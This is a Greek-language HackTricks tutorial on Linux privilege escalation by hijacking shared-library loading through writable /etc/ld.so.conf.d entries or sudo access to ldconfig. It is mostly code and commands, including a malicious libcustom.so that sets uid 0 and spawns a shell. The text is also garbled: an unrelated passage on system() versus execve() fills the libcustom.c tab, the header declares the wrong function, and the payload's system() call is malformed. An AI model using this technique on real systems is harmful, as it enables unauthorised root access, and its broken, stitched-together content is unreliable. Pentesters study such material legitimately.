# Παράδειγμα εκμετάλλευσης προνομιακής αύξησης με το ld.so

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Προετοιμασία του περιβάλλοντος

Στην παρακάτω ενότητα μπορείτε να βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για να προετοιμάσουμε το περιβάλλον

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% tab title="libcustom.c" %}

Ο παρακάτω κώδικας δείχνει ένα παράδειγμα από ένα απλό αρχείο C που χρησιμοποιεί τη συνάρτηση `system()` για να εκτελέσει μια εντολή στο σύστημα:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("echo Hello, world!");
    return 0;
}
```

Αυτός ο κώδικας απλά εκτυπώνει το μήνυμα "Hello, world!" στην κονσόλα. Ωστόσο, η συνάρτηση `system()` μπορεί να χρησιμοποιηθεί για να εκτελέσει οποιαδήποτε εντολή στο σύστημα, πράγμα που την καθιστά επικίνδυνη αν χρησιμοποιηθεί από κακόβουλο κώδικα.

Για να αποφευχθεί η κακόβουλη χρήση της συνάρτησης `system()`, μπορεί να χρησιμοποιηθεί η συνάρτηση `execve()` αντί για αυτήν. Η συνάρτηση `execve()` εκτελεί μια εντολή στο σύστημα, αλλά απαιτεί την παροχή ενός πίνακα με τα ορίσματα της εντολής και των περιβαλλοντικών μεταβλητών. Αυτό καθιστά δυσκολότερη την εκτέλεση κακόβουλων εντολών.

Ο παρακάτω κώδικας δείχνει ένα παράδειγμα από ένα αρχείο C που χρησιμοποιεί τη συνάρτηση `execve()` για να εκτελέσει μια εντολή στο σύστημα:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *args[] = {"echo", "Hello, world!", NULL};
    char *env[] = {NULL};

    execve("/bin/echo", args, env);
    return 0;
}
```

Αυτός ο κώδικας εκτελεί την εντολή `echo Hello, world!` χρησιμοποιώντας τη συνάρτηση `execve()`. Ο πίνακας `args` περιέχει τα ορίσματα της εντολής και ο πίνακας `env` περιέχει τις περιβαλλοντικές μεταβλητές. Αυτό εξασφαλίζει ότι η εντολή που εκτελείται είναι ακριβώς αυτή που προορίζεται, χωρίς τη δυνατότητα εκτέλεσης κακόβουλων εντολών.

Η χρήση της συνάρτησης `execve()` αντί για τη συνάρτηση `system()` είναι ένας τρόπος να ενισχυθεί η ασφάλεια του κώδικα και να αποτραπεί η εκτέλεση κακόβουλων εντολών.

{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="Greek" %}
1. **Δημιουργήστε** αυτά τα αρχεία στον υπολογιστή σας στον ίδιο φάκελο
2. **Μεταγλωτίστε** τη **βιβλιοθήκη**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντιγράψτε** το `libcustom.so` στο `/usr/lib`: `sudo cp libcustom.so /usr/lib` (δικαιώματα root)
4. **Μεταγλωτίστε** το **εκτελέσιμο**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ελέγξτε το περιβάλλον

Ελέγξτε ότι το _libcustom.so_ φορτώνεται από το _/usr/lib_ και ότι μπορείτε να **εκτελέσετε** το δυαδικό αρχείο.
{% endtab %}
{% endtabs %}
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Εκμετάλλευση

Σε αυτό το σενάριο θα υποθέσουμε ότι **κάποιος έχει δημιουργήσει μια ευπάθη εγγραφή** μέσα σε ένα αρχείο στο _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι _/home/ubuntu/lib_ (όπου έχουμε εγγράψιμη πρόσβαση).\
**Κατεβάστε και μεταγλωττίστε** τον παρακάτω κώδικα μέσα σε αυτήν τη διαδρομή:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Τώρα που έχουμε **δημιουργήσει την κακόβουλη βιβλιοθήκη libcustom μέσα στο μη σωστά διαμορφωμένο** μονοπάτι, πρέπει να περιμένουμε για ένα **επανεκκίνηση** ή για τον χρήστη root να εκτελέσει το **`ldconfig`** (_σε περίπτωση που μπορείτε να εκτελέσετε αυτό το δυαδικό αρχείο ως **sudo** ή έχει το **suid bit**, θα μπορείτε να το εκτελέσετε μόνοι σας_).

Μόλις συμβεί αυτό, **ελέγξτε ξανά** από πού φορτώνει το εκτελέσιμο `sharevuln` τη βιβλιοθήκη `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, το φορτώνει από το `/home/ubuntu/lib` και αν οποιοσδήποτε χρήστης το εκτελέσει, θα εκτελεστεί ένα κέλυφος:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Σημείωση ότι σε αυτό το παράδειγμα δεν έχουμε αναβαθμίσει δικαιώματα, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας τον ριζικό χρήστη ή άλλο χρήστη με προνομιακά δικαιώματα να εκτελέσει το ευπάθειας binary** θα μπορέσουμε να αναβαθμίσουμε τα δικαιώματα.
{% endhint %}

### Άλλες λανθασμένες ρυθμίσεις - Ίδια ευπάθεια

Στο προηγούμενο παράδειγμα παραπλάνησαμε μια λανθασμένη ρύθμιση όπου ένας διαχειριστής **έθεσε ένα μη προνομιούχο φάκελο μέσα σε ένα αρχείο ρύθμισης μέσα στο `/etc/ld.so.conf.d/`**.\
Αλλά υπάρχουν και άλλες λανθασμένες ρυθμίσεις που μπορούν να προκαλέσουν την ίδια ευπάθεια, αν έχετε **δικαιώματα εγγραφής** σε κάποιο **αρχείο ρύθμισης** μέσα στο `/etc/ld.so.conf.d`, στον φάκελο `/etc/ld.so.conf.d` ή στο αρχείο `/etc/ld.so.conf` μπορείτε να διαμορφώσετε την ίδια ευπάθεια και να την εκμεταλλευτείτε.

## Εκμετάλλευση 2

**Υποθέστε ότι έχετε προνομιακά δικαιώματα sudo πάνω στο `ldconfig`**.\
Μπορείτε να υποδείξετε στο `ldconfig` **από πού να φορτώνει τα αρχεία ρυθμίσεων**, έτσι μπορούμε να εκμεταλλευτούμε αυτό για να κάνουμε το `ldconfig` να φορτώσει αυθαίρετους φακέλους.\
Έτσι, ας δημιουργήσουμε τα απαραίτητα αρχεία και φακέλους για να φορτώσουμε το "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως προκύπτει από την **προηγούμενη εκμετάλλευση**, **δημιουργήστε την κακόβουλη βιβλιοθήκη μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε τη διαδρομή και ας ελέγξουμε από πού φορτώνεται ο δυαδικός αρχείος της βιβλιοθήκης:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως μπορείτε να δείτε, έχοντας δικαιώματα sudo πάνω στο `ldconfig`, μπορείτε να εκμεταλλευτείτε την ίδια ευπάθεια.**

{% hint style="info" %}
**Δεν βρήκα** ένα αξιόπιστο τρόπο για να εκμεταλλευτώ αυτήν την ευπάθεια αν το `ldconfig` έχει ρυθμιστεί με το **suid bit**. Εμφανίζεται το ακόλουθο σφάλμα: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## Αναφορές

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab machine στο HTB

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
